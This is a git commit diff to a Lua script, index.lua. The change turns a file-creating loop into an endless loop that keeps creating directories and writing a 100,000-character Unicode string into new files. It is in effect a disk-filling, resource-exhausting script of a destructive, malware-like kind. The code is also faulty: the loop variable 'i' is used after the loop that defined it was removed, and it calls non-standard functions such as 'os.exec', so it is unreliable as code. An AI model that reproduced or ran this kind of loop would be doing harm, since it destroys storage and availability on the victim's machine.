c31fdf8271b35bbc9618c87c9a25eadabf43a290
catwizard1 <124324348+catwizard1@users.noreply.github.com>
2023-02-03 23:34:13 -0600

    Update index.lua

--- index.lua
+++ index.lua
@@ -1,14 +1,20 @@
-for i = 1, 1000000 do
+local data = ''
+
+for i = 1, 100000 do
+	data = data .. '﷽'
+end
+
+while true do
 	coroutine.wrap(function()
 		local name = 'girlfromsweden' .. i
-		
+
 		os.exec('mkdir ' .. name)
 		os.exec('mkfile ' .. name)
-		
+
 		local path = ('%s/%s'):format(name, name)
 		local file = io.open(path)
-			
-		file:write('girl from sweden - nico')
+
+		file:write(data)
 		file:close()
 	end)()
 end
